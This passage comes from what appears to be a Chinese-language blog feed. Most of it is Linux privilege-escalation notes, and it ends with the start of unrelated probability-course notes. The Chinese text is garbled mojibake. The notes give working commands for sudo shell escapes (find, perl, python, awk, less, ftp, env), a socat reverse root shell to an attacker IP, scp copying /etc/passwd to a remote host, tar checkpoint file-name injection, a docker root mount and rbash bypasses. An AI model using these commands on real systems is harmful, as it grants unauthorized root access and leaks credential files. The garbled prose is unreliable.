find <span class="hljs-built_in">test</span> -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null<br></code></pre></td></tr></table></figure><p>å½“ vim è¢«èµ‹äºˆ suid æƒé™åï¼Œæ„å‘³ç€ä»»ä½•ç”¨æˆ·éƒ½å¯ä»¥ä½¿ç”¨ vim æ¥ç¼–è¾‘é‚£äº›åªèƒ½ç”± root ç¼–è¾‘çš„æ–‡ä»¶.</p><p>å¦‚ï¼Œä¿®æ”¹ <code>/etc/sudoers</code> æ–‡ä»¶ï¼Œç»™ä½ å½“å‰ç”¨æˆ·æ·»åŠ æ‰§è¡Œ <code>sudo</code> çš„æƒé™ï¼Œä¹Ÿå°±æ˜¯è·å¾—äº† root æƒé™.</p><p>å¯ä»¥ç”¨ <code>sudo -l</code> æŸ¥çœ‹å½“å‰ç”¨æˆ·çš„ <code>sudo</code> æƒé™.</p><h1 id="åˆ©ç”¨-sudo-è¿›è¡Œææƒ"><a href="#åˆ©ç”¨-sudo-è¿›è¡Œææƒ" class="headerlink" title="åˆ©ç”¨ sudo è¿›è¡Œææƒ"></a>åˆ©ç”¨ sudo è¿›è¡Œææƒ</h1><p><code>sudo</code> å’Œ <code>su</code> çš„åŒºåˆ«:</p><ul><li><code>sudo</code> å…¨ç§°æ˜¯ super user do, æ˜¯ç”¨ root æƒé™æ‰§è¡Œå‘½ä»¤</li><li><code>su</code> å…¨ç§°æ˜¯ substitute user, æ˜¯åˆ‡æ¢è´¦å·</li></ul><p><code>/etc/sudoers</code> æ–‡ä»¶ä¸­ï¼Œå¯¹ç”¨æˆ·è¿›è¡Œé…ç½®çš„æ ¼å¼, å¦‚:</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs subunit"><span class="hljs-keyword">test </span>ALL=(ALL:ALL) ALL<br></code></pre></td></tr></table></figure><p><img src="/../img/sudoers_file_configurate_user.png"></p><p>ä¸å¯ç”¨ <code>sudo</code> æ‰§è¡Œçš„å‘½ä»¤å¯ä»¥å†™æˆå¦‚:</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs subunit"><span class="hljs-keyword">test </span>ALL=(ALL:ALL) ALL !/usr/bin/find<br></code></pre></td></tr></table></figure><p>å„å‘½ä»¤ç”¨é€—å· <code>,</code> åˆ†éš”:</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs subunit"><span class="hljs-keyword">test </span>ALL=(ALL:ALL) /usr/bin/find,/usr/bin/vim<br></code></pre></td></tr></table></figure><h2 id="å½“-sudo-å…è®¸æ‰§è¡Œ-git-å‘½ä»¤æ—¶ï¼Œå¯åˆ©ç”¨-git-è¿›è¡Œææƒ"><a href="#å½“-sudo-å…è®¸æ‰§è¡Œ-git-å‘½ä»¤æ—¶ï¼Œå¯åˆ©ç”¨-git-è¿›è¡Œææƒ" class="headerlink" title="å½“ sudo å…è®¸æ‰§è¡Œ git å‘½ä»¤æ—¶ï¼Œå¯åˆ©ç”¨ git è¿›è¡Œææƒ"></a>å½“ sudo å…è®¸æ‰§è¡Œ git å‘½ä»¤æ—¶ï¼Œå¯åˆ©ç”¨ git è¿›è¡Œææƒ</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ sudo git <span class="hljs-built_in">help</span> config<br></code></pre></td></tr></table></figure><p>æˆ–:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ sudo git -p <span class="hljs-built_in">help</span><br></code></pre></td></tr></table></figure><p>ä¸Šè¿°å‘½ä»¤å¯ä»¥è¿›å…¥ <code>git</code> çš„å¸®åŠ©é¡µé¢ï¼Œç„¶ååœ¨æ­¤é¡µé¢ä¸‹æ‰§è¡Œç»ˆç«¯å‘½ä»¤:</p><p><img src="/../img/using_git_to_enhance_the_power.png"></p><h2 id="å…¶ä»–å‘½ä»¤"><a href="#å…¶ä»–å‘½ä»¤" class="headerlink" title="å…¶ä»–å‘½ä»¤"></a>å…¶ä»–å‘½ä»¤</h2><h3 id="ç”¨-find-å‘½ä»¤"><a href="#ç”¨-find-å‘½ä»¤" class="headerlink" title="ç”¨ find å‘½ä»¤"></a>ç”¨ find å‘½ä»¤</h3><p>å¦‚åˆ©ç”¨ <code>find</code> å‘½ä»¤çš„ <code>exec</code> å‚æ•°æ¥åˆ‡æ¢åˆ° root æƒé™.</p><p><code>find</code> ä½¿ç”¨ <code>exec</code> å‚æ•°æ—¶ï¼Œéœ€è¦ä»¥åˆ†å·ç»“å°¾ï¼Œä½†ç”±äºåˆ†å·åœ¨å‘½ä»¤è¡Œä¸­æ˜¯ç‰¹æ®Šå­—ç¬¦ï¼Œè¦ç”¨ <code>\</code> è¿›è¡Œè½¬ä¹‰, å¦‚:</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">$ <span class="hljs-keyword">find</span> <span class="hljs-regexp">/ -exec &quot;/</span>bin/bash<span class="hljs-string">&quot; \;</span><br></code></pre></td></tr></table></figure><h3 id="ç”¨-perl"><a href="#ç”¨-perl" class="headerlink" title="ç”¨ perl"></a>ç”¨ perl</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ sudo perl -e <span class="hljs-string">&#x27;exec &quot;/bin/bash&quot;;&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="ç”¨-python"><a href="#ç”¨-python" class="headerlink" title="ç”¨ python"></a>ç”¨ python</h3><p>è°ƒç”¨ pty åº“ï¼Œè¿™æ˜¯ä¸€ä¸ªä¼ªç»ˆç«¯åº“ï¼Œå®ƒçš„ spawn ä¼šè°ƒç”¨æŒ‡å®šçš„ç¨‹åº:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ sudo python3 -c <span class="hljs-string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="ç”¨-less-å‘½ä»¤"><a href="#ç”¨-less-å‘½ä»¤" class="headerlink" title="ç”¨ less å‘½ä»¤"></a>ç”¨ <code>less</code> å‘½ä»¤</h3><p>è¾“å…¥ <code>sudo less filename</code> æµè§ˆæ–‡ä»¶å†…å®¹æ—¶ï¼Œåˆ°åº•éƒ¨è¾“å…¥ <code>!bash</code> åå›è½¦ï¼Œä¼šè·å¾—ä¸€ä¸ª <code>root</code> æƒé™çš„ shell.</p><h3 id="ç”¨-awk-å‘½ä»¤"><a href="#ç”¨-awk-å‘½ä»¤" class="headerlink" title="ç”¨ awk å‘½ä»¤"></a>ç”¨ <code>awk</code> å‘½ä»¤</h3><p>é€šè¿‡è°ƒç”¨ linux çš„ system å‡½æ•°æ¥æ‰“å¼€ bash:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ sudo awk <span class="hljs-string">&#x27;BEGIN &#123;system(&quot;/bin/bash&quot;)&#125;&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="ç”¨-man-å‘½ä»¤"><a href="#ç”¨-man-å‘½ä»¤" class="headerlink" title="ç”¨ man å‘½ä»¤"></a>ç”¨ <code>man</code> å‘½ä»¤</h3><p>é€šè¿‡ <code>sudo man man</code> å‘½ä»¤æ¥æ‰“å¼€ <code>man</code> çš„æ‰‹å†Œï¼Œè¾“å…¥ <code>!bash</code>, è·å¾—ä¸€ä¸ªå…·æœ‰ <code>root</code> æƒé™çš„ shell.</p><h3 id="ç”¨-vi-å‘½ä»¤"><a href="#ç”¨-vi-å‘½ä»¤" class="headerlink" title="ç”¨ vi å‘½ä»¤"></a>ç”¨ <code>vi</code> å‘½ä»¤</h3><p>åœ¨ normal æ¨¡å¼ä¸‹è¾“å…¥ <code>!bash</code></p><h3 id="ä¸€äº›è„šæœ¬æ–‡ä»¶"><a href="#ä¸€äº›è„šæœ¬æ–‡ä»¶" class="headerlink" title="ä¸€äº›è„šæœ¬æ–‡ä»¶"></a>ä¸€äº›è„šæœ¬æ–‡ä»¶</h3><p>æ–‡ä»¶å†…å®¹å¦‚:<br>shell è„šæœ¬:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-meta">#! /bin/bash</span><br>/bin/bash<br></code></pre></td></tr></table></figure><p>perl è„šæœ¬:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-comment">#! /usr/bin/perl</span><br><span class="hljs-keyword">exec</span> <span class="hljs-string">&quot;/bin/bash&quot;</span>;<br></code></pre></td></tr></table></figure><h3 id="åº”ç”¨ç¨‹åº"><a href="#åº”ç”¨ç¨‹åº" class="headerlink" title="åº”ç”¨ç¨‹åº"></a>åº”ç”¨ç¨‹åº</h3><p>å¦‚ env, ftp, socat, scp.</p><h4 id="é€šè¿‡-env-ç¯å¢ƒå˜é‡æ¥è·å–-root-æƒé™"><a href="#é€šè¿‡-env-ç¯å¢ƒå˜é‡æ¥è·å–-root-æƒé™" class="headerlink" title="é€šè¿‡ env ç¯å¢ƒå˜é‡æ¥è·å– root æƒé™"></a>é€šè¿‡ env ç¯å¢ƒå˜é‡æ¥è·å– root æƒé™</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ sudo <span class="hljs-built_in">env</span> /bin/bash<br></code></pre></td></tr></table></figure><h4 id="é€šè¿‡-ftp-æ¥è¿›å…¥-bash-è·å–-root-æƒé™"><a href="#é€šè¿‡-ftp-æ¥è¿›å…¥-bash-è·å–-root-æƒé™" class="headerlink" title="é€šè¿‡ ftp æ¥è¿›å…¥ bash è·å– root æƒé™"></a>é€šè¿‡ ftp æ¥è¿›å…¥ bash è·å– root æƒé™</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ sudo ftp<br>ftp&gt; !/bin/bash<br></code></pre></td></tr></table></figure><h4 id="é€šè¿‡-socat-å®¢æˆ·ç«¯è¿æ¥æ”»å‡»æœºï¼Œæ”»å‡»æœºå¯è·å¾—-rootshell"><a href="#é€šè¿‡-socat-å®¢æˆ·ç«¯è¿æ¥æ”»å‡»æœºï¼Œæ”»å‡»æœºå¯è·å¾—-rootshell" class="headerlink" title="é€šè¿‡ socat å®¢æˆ·ç«¯è¿æ¥æ”»å‡»æœºï¼Œæ”»å‡»æœºå¯è·å¾— rootshell"></a>é€šè¿‡ socat å®¢æˆ·ç«¯è¿æ¥æ”»å‡»æœºï¼Œæ”»å‡»æœºå¯è·å¾— rootshell</h4><p>socat æ˜¯ Socket Cat å’Œ Netcat ç±»ä¼¼.</p><p>å…ˆæ‰§è¡ŒæœåŠ¡ç«¯ï¼Œåæ‰§è¡Œå®¢æˆ·ç«¯</p><p>å®¢æˆ·ç«¯æ‰§è¡Œ:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ sudo socat <span class="hljs-built_in">exec</span>:<span class="hljs-string">&#x27;sh -li&#x27;</span>,pty,stderr,setsid,sigint,sane tcp:192.168.23.128:4444<br></code></pre></td></tr></table></figure><p>æ”»å‡»æœºæ‰§è¡Œ:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ socat file:`<span class="hljs-built_in">tty</span>`,raw,<span class="hljs-built_in">echo</span>=0 tcp-listen:4444<br></code></pre></td></tr></table></figure><h4 id="scp-ç”¨æ¥å¤åˆ¶ä¸€äº›ç³»ç»Ÿçš„æ•æ„Ÿæ–‡ä»¶"><a href="#scp-ç”¨æ¥å¤åˆ¶ä¸€äº›ç³»ç»Ÿçš„æ•æ„Ÿæ–‡ä»¶" class="headerlink" title="scp, ç”¨æ¥å¤åˆ¶ä¸€äº›ç³»ç»Ÿçš„æ•æ„Ÿæ–‡ä»¶"></a>scp, ç”¨æ¥å¤åˆ¶ä¸€äº›ç³»ç»Ÿçš„æ•æ„Ÿæ–‡ä»¶</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ sudo scp /etc/passwd root@192.168.23.128:/root/Desktop<br></code></pre></td></tr></table></figure><p>åˆ©ç”¨çˆ†ç ´è½¯ä»¶ç ´è§£ï¼Œå¦‚ <code>john</code> å‘½ä»¤.</p><h2 id="é»‘åå•æƒ…å†µ"><a href="#é»‘åå•æƒ…å†µ" class="headerlink" title="é»‘åå•æƒ…å†µ"></a>é»‘åå•æƒ…å†µ</h2><p>ç»•è¿‡ sudoers çš„é»‘åå•ï¼Œå°†å‘½ä»¤å¤åˆ¶åˆ°å…¶ä»–è·¯å¾„ä¸‹.</p><h1 id="NFS-é…ç½®ä¸å½“å¯¼è‡´"><a href="#NFS-é…ç½®ä¸å½“å¯¼è‡´" class="headerlink" title="NFS é…ç½®ä¸å½“å¯¼è‡´"></a>NFS é…ç½®ä¸å½“å¯¼è‡´</h1><p>NFS æ˜¯ Network File System (ç½‘ç»œæ–‡ä»¶ç³»ç»Ÿ) çš„ç¼©å†™. ç”¨æ¥æŒ‚è½½æŸä¸ªç›®å½•æˆ–æ–‡ä»¶è¿›è¡Œå…±äº«ï¼Œé»˜è®¤æ˜¯ 2049 ç«¯å£.</p><p>é¦–å…ˆéœ€è¦å®‰è£… nfs çš„æœåŠ¡ç«¯.</p><h1 id="ä½¿ç”¨-PATH-å˜é‡è¿›è¡Œ-Linux-ææƒ"><a href="#ä½¿ç”¨-PATH-å˜é‡è¿›è¡Œ-Linux-ææƒ" class="headerlink" title="ä½¿ç”¨ PATH å˜é‡è¿›è¡Œ Linux ææƒ"></a>ä½¿ç”¨ PATH å˜é‡è¿›è¡Œ Linux ææƒ</h1><p>root ç»™ä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶èµ‹äºˆäº† suid, è€Œæ­¤æ–‡ä»¶åˆè°ƒç”¨äº†å¦ä¸€ä¸ªè„šæœ¬ï¼Œè¿™ä¸ªè„šæœ¬çš„æ‰§è¡Œæ—¶ä¹Ÿä¼šè·å¾— root æƒé™.</p><p>ä¹Ÿæ˜¯é…åˆ suid.</p><h1 id="åˆ©ç”¨-Cron-è¿›è¡Œ-Linux-ææƒ"><a href="#åˆ©ç”¨-Cron-è¿›è¡Œ-Linux-ææƒ" class="headerlink" title="åˆ©ç”¨ Cron è¿›è¡Œ Linux ææƒ"></a>åˆ©ç”¨ Cron è¿›è¡Œ Linux ææƒ</h1><p>cronjobs æ˜¯å®šæ—¶ä»»åŠ¡ï¼Œåœ¨ç‰¹å®šçš„æ—¥æœŸå’Œæ—¶é—´æ‰§è¡Œè®¡åˆ’ä»»åŠ¡.</p><p>åœ¨å…¶é…ç½®æ–‡ä»¶ <code>/etc/crontab</code> ä¸‹é…ç½®.</p><p>å®šä¹‰æ ¼å¼å¦‚ä¸‹:<br><img src="/../img/format_of_definition_of_cron.png"></p><p>å¦‚ï¼Œæ·»åŠ ä¸€ä¸ªä»»åŠ¡ä¸º:</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">*<span class="hljs-regexp">/2 *  * * *  root  /</span>tmp/hack.pl<br></code></pre></td></tr></table></figure><p>è¿™ä¸ªå®šæ—¶è„šæœ¬å…·æœ‰ root æƒé™ã€‚(è„šæœ¬éœ€è¦æœ‰å¯æ‰§è¡Œæƒé™:)</p><p>å¯ä»¥è®©è„šæœ¬æ–‡ä»¶ä¿®æ”¹ <code>sudoers</code> æ–‡ä»¶ï¼ŒæŠŠå½“å‰ç”¨æˆ·æ·»åŠ è¿›å»ï¼Œè·å¾— <code>sudo</code> æ‰€æœ‰æƒï¼Œä»è€Œè¿›è¡Œææƒ.</p><p>é…åˆ <code>tar</code> å‘½ä»¤çš„ <code>--checkpoint[=N]</code> å‚æ•°å’Œ <code>--checkpoint-action=ACTION</code> å‚æ•°. ä¸ºï¼Œæ¯å‹ç¼©å¤šå°‘ä¸ªæ–‡ä»¶ï¼Œæ‰§è¡Œä¸€æ¬¡ <code>--checkpoint-action</code> åçš„å‘½ä»¤.</p><p>è®© <code>tar</code> å°†æ–‡ä»¶åå½“ä½œå‚æ•°æ‰§è¡Œ, ä¸¤ä¸ªæ–‡ä»¶åä¸ºåˆ†åˆ«ä¸º: <code>--checkpoint=1</code> å’Œ <code>--checkpoint-action=sh hack.pl</code>, é‚£ä¹ˆï¼Œ <code>tar</code> æ‰“åŒ…è¿™ä¸¤ä¸ªæ–‡ä»¶çš„å‘½ä»¤å°±æˆäº†:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ tar --checkpoint=1<br></code></pre></td></tr></table></figure><p>å’Œ</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ tar --checkpoint-action=sh hack.pl<br></code></pre></td></tr></table></figure><h1 id="åˆ©ç”¨-Docker-è¿›è¡Œ-Linux-ææƒ"><a href="#åˆ©ç”¨-Docker-è¿›è¡Œ-Linux-ææƒ" class="headerlink" title="åˆ©ç”¨ Docker è¿›è¡Œ Linux ææƒ"></a>åˆ©ç”¨ Docker è¿›è¡Œ Linux ææƒ</h1><p>æ¡ä»¶æ˜¯ï¼Œæ™®é€šç”¨æˆ·è¢«æ·»åŠ åˆ°äº† docker ç”¨æˆ·ç»„ä¸­.</p><p>åˆ©ç”¨æ–¹å¼å¦‚:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ docker run -v /:/mnt -it alpine<br></code></pre></td></tr></table></figure><p>ç›¸å½“äºæœ‰äº† root æƒé™.</p><p>è¿˜æœ‰å°† <code>/etc/passwd</code>, <code>/etc/sudoers</code> ç­‰æ–‡ä»¶æŒ‚è½½è¿› docker å®¹å™¨, ç„¶åä¿®æ”¹.</p><h1 id="rbash-ç»•è¿‡æ€»ç»“"><a href="#rbash-ç»•è¿‡æ€»ç»“" class="headerlink" title="rbash ç»•è¿‡æ€»ç»“"></a>rbash ç»•è¿‡æ€»ç»“</h1><p>rbash æ˜¯ Restricted bash çš„ç¼©å†™ã€‚</p><p>ç®¡ç†å‘˜å¯é€šè¿‡æŒ‡å®šæ™®é€šç”¨æˆ·çš„ bash ä¸º rbash, æ¥é™åˆ¶ç›¸å…³æ“ä½œ. åœ¨ rbash ä¸­ï¼Œå¾ˆå¤šè¡Œä¸ºå’Œå‘½ä»¤éƒ½ä¼šè¢«å—åˆ°é™åˆ¶ ã€‚</p><p>è¿™é‡Œå®é™…ä¸ºç»•è¿‡ rbash çš„é™åˆ¶ï¼Œç»•è¿‡ä¹‹åä¾æ—§æ˜¯å½“å‰çš„æ™®é€šç”¨æˆ·ï¼Œå› æ­¤ä¸ç®—ææƒ.</p><p>å°†ç”¨æˆ·é»˜è®¤ç»ˆç«¯è®¾ç½®ä¸º rbash:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ usermod -s /bin/rbash username<br></code></pre></td></tr></table></figure><h2 id="é€šè¿‡-vi-ç»•è¿‡"><a href="#é€šè¿‡-vi-ç»•è¿‡" class="headerlink" title="é€šè¿‡ vi ç»•è¿‡"></a>é€šè¿‡ vi ç»•è¿‡</h2><p>åœ¨ vi çš„ normal æ¨¡å¼ä¸‹è¾“å…¥ <code>:!/bin/bash</code>, è¿”å›ä¸€ä¸ªç»ˆç«¯.</p><h2 id="ç”¨-ed-ç»•è¿‡"><a href="#ç”¨-ed-ç»•è¿‡" class="headerlink" title="ç”¨ ed ç»•è¿‡"></a>ç”¨ ed ç»•è¿‡</h2><p>ed ä¹Ÿæ˜¯ä¸€ä¸ªç¼–è¾‘å™¨ï¼Œå’Œ vi ç±»ä¼¼ï¼Œä¹Ÿå¯è¾“å…¥å‘½ä»¤.</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ ed<br>!<span class="hljs-string">&#x27;/bin/bash&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="å¯ä»¥åœ¨-rbash-ä¸­æ‰§è¡Œ-sh-bash-dash-ç­‰"><a href="#å¯ä»¥åœ¨-rbash-ä¸­æ‰§è¡Œ-sh-bash-dash-ç­‰" class="headerlink" title="å¯ä»¥åœ¨ rbash ä¸­æ‰§è¡Œ sh, bash, dash ç­‰"></a>å¯ä»¥åœ¨ rbash ä¸­æ‰§è¡Œ sh, bash, dash ç­‰</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ sh<br>$ <span class="hljs-comment"># or</span><br>$ bash<br>$ <span class="hljs-comment"># or</span><br>$ dash<br></code></pre></td></tr></table></figure><h2 id="ä½¿ç”¨-python-perl-ç»•è¿‡"><a href="#ä½¿ç”¨-python-perl-ç»•è¿‡" class="headerlink" title="ä½¿ç”¨ python, perl ç»•è¿‡"></a>ä½¿ç”¨ python, perl ç»•è¿‡</h2><p>å¦‚æœå¯ä»¥è¿è¡Œ python æˆ– perl çš„è¯:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ perl -e <span class="hljs-string">&#x27;system(&quot;/bin/sh&quot;)&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="ä½¿ç”¨-awk-ç»•è¿‡"><a href="#ä½¿ç”¨-awk-ç»•è¿‡" class="headerlink" title="ä½¿ç”¨ awk ç»•è¿‡"></a>ä½¿ç”¨ awk ç»•è¿‡</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ awk <span class="hljs-string">&#x27;BEGIN &#123;system(&quot;/bin/sh&quot;)&#125;&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="ä½¿ç”¨-more-less-man-ç­‰ç»•è¿‡"><a href="#ä½¿ç”¨-more-less-man-ç­‰ç»•è¿‡" class="headerlink" title="ä½¿ç”¨ more, less, man ç­‰ç»•è¿‡"></a>ä½¿ç”¨ more, less, man ç­‰ç»•è¿‡</h2><p>éšä¾¿è¯»å–ä¸€ä¸ªæ–‡ä»¶.</p><p>å¦‚:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ more .bashrc<br>!<span class="hljs-string">&#x27;sh&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="ssh-ç™»å½•ç»•è¿‡"><a href="#ssh-ç™»å½•ç»•è¿‡" class="headerlink" title="ssh ç™»å½•ç»•è¿‡"></a>ssh ç™»å½•ç»•è¿‡</h2><p>ç”¨ ssh ç™»å½•æ—¶ç»™è‡ªå·±åˆ†é… bash:</p><p>å¦‚: </p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ ssh username@192.168.23.134 -t <span class="hljs-string">&quot;bash --noprofile&quot;</span><br></code></pre></td></tr></table></figure><h1 id="åˆ©ç”¨å·¥å…·æŸ¥æ‰¾æ¼æ´ææƒ"><a href="#åˆ©ç”¨å·¥å…·æŸ¥æ‰¾æ¼æ´ææƒ" class="headerlink" title="åˆ©ç”¨å·¥å…·æŸ¥æ‰¾æ¼æ´ææƒ"></a>åˆ©ç”¨å·¥å…·æŸ¥æ‰¾æ¼æ´ææƒ</h1><p>å®‰å…¨è„šæœ¬å¦‚:</p><ul><li><a href="http://github.com/rebootuser/LinEnum"><code>http://github.com/rebootuser/LinEnum</code></a></li><li><a href="http://github.com/jondonas/linux-exploit-suggester-2"><code>http://github.com/jondonas/linux-exploit-suggester-2</code></a></li><li><a href="http://github.com/redcode-labs/Bashark"><code>http://github.com/redcode-labs/Bashark</code></a></li><li><a href="http://github.com/AlessandroZ/BeRoot"><code>http://github.com/AlessandroZ/BeRoot</code></a></li><li><a href="http://github.com/SecWiki/linux-kernel-exploits"><code>http://github.com/SecWiki/linux-kernel-exploits</code></a></li><li><a href="http://github.com/diego-treitos/linux-smart-enumeration"><code>http://github.com/diego-treitos/linux-smart-enumeration</code></a></li></ul>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>æ¦‚ç‡è®ºä¸æ•°ç†ç»Ÿè®¡è¯¾ç¨‹ç¬”è®°</title>
    <link href="/2022/12/07/%E6%A6%82%E7%8E%87%E8%AE%BA%E4%B8%8E%E6%95%B0%E7%90%86%E7%BB%9F%E8%AE%A1%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/"/>
    <url>/2022/12/07/%E6%A6%82%E7%8E%87%E8%AE%BA%E4%B8%8E%E6%95%B0%E7%90%86%E7%BB%9F%E8%AE%A1%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="ç¬¬ä¸€ç« -æ¦‚ç‡è®ºçš„åŸºæœ¬æ¦‚å¿µ"><a href="#ç¬¬ä¸€ç« -æ¦‚ç‡è®ºçš„åŸºæœ¬æ¦‚å¿µ" class="headerlink" title="ç¬¬ä¸€ç«  æ¦‚ç‡è®ºçš„åŸºæœ¬æ¦‚å¿µ"></a>ç¬¬ä¸€ç«  æ¦‚ç‡è®ºçš„åŸºæœ¬æ¦‚å¿µ</h1><h2 id="éšæœºè¯•éªŒ"><a href="#éšæœºè¯•éªŒ" class="headerlink" title="éšæœºè¯•éªŒ"></a>éšæœºè¯•éªŒ</h2><p>å¯¹éšæœºç°è±¡çš„è§‚å¯Ÿï¼Œè®°å½•ï¼Œå®éªŒç»Ÿç§°ä¸º <mark>éšæœºè¯•éªŒ</mark>.</p><blockquote><p>ç‰¹æ€§:</p></blockquote><ul><li>åœ¨ç›¸åŒæ¡ä»¶ä¸‹é‡å¤è¿›è¡Œ</li><li>äº‹å…ˆçŸ¥é“å¯èƒ½å‡ºç°çš„ç»“æœ</li><li>è¿›è¡Œè¯•éªŒå‰å¹¶ä¸çŸ¥é“å“ªä¸ªè¯•éªŒç»“æœæˆ–å‘ç”Ÿ</li></ul><h2 id="æ ·æœ¬ç©ºé—´"><a href="#æ ·æœ¬ç©ºé—´" class="headerlink" title="æ ·æœ¬ç©ºé—´"></a>æ ·æœ¬ç©ºé—´</h2><blockquote><p>å®šä¹‰:</p></blockquote><p>éšæœºè¯•éªŒ E çš„æ‰€æœ‰ç»“æœæ„æˆçš„é›†åˆç§°ä¸º E çš„ <mark>æ ·æœ¬ç©ºé—´</mark>, è®° $S &#x3D; {e}$.</p><p>S ä¸­çš„å…ƒç´ ç§° <mark>æ ·æœ¬ç‚¹</mark>. (ä¹Ÿå°±æ˜¯æ ·æœ¬ç©ºé—´å†…çš„ä¸€ç‚¹)</p><p>ä¸€ä¸ªå…ƒç´ çš„å•ç‚¹é›†ç§°ä¸º <mark>åŸºæœ¬äº‹ä»¶</mark> (ä¹Ÿå°±æ˜¯è¯´ï¼Œé›†åˆä¸­åªæœ‰ä¸€ä¸ªæ ·æœ¬ç‚¹ï¼Œè¿™ä¸ªé›†åˆå°±æ˜¯åŸºæœ¬äº‹ä»¶)</p><p><mark>äº‹ä»¶</mark> éƒ½æ˜¯é›†åˆ, æ˜¯é›†åˆçš„åˆ«ç§°.</p><h2 id="éšæœºäº‹ä»¶"><a href="#éšæœºäº‹ä»¶" class="headerlink" title="éšæœºäº‹ä»¶"></a>éšæœºäº‹ä»¶</h2><p>S çš„å­é›† A ä¸º E çš„ <mark>éšæœºäº‹ä»¶</mark>  A, ç®€ç§° <mark>äº‹ä»¶</mark> A. (ä¹Ÿå°±æ˜¯è¯´ï¼Œæ ·æœ¬ç©ºé—´çš„ä¸€ä¸ªå­é›†å°±æ˜¯ä¸€ä¸ªéšæœºäº‹ä»¶)</p><blockquote><p>ç‰¹å¾:</p></blockquote><ul><li>äº‹ä»¶ A æ˜¯ç›¸åº”çš„æ ·æœ¬ç©ºé—´ S çš„ä¸€ä¸ªå­é›†ï¼Œå…¶å…³ç³»å¯ç”¨ Venn å›¾æ¥è¡¨ç¤º</li><li>äº‹ä»¶ A å‘ç”Ÿå½“ä¸”ä»…å½“ A ä¸­çš„æŸä¸€ä¸ªæ ·æœ¬ç‚¹å‡ºç°</li><li>äº‹ä»¶ A çš„è¡¨ç¤ºå¯ç”¨é›†åˆï¼Œä¹Ÿå¯ç”¨è¯­è¨€æ¥è¡¨ç¤º</li></ul><h2 id="äº‹ä»¶çš„è¿ç®—"><a href="#äº‹ä»¶çš„è¿ç®—" class="headerlink" title="äº‹ä»¶çš„è¿ç®—"></a>äº‹ä»¶çš„è¿ç®—</h2><p><mark>å’Œäº‹ä»¶</mark> $A \cup B$ &#x3D;&#x3D;&gt; A ä¸ B 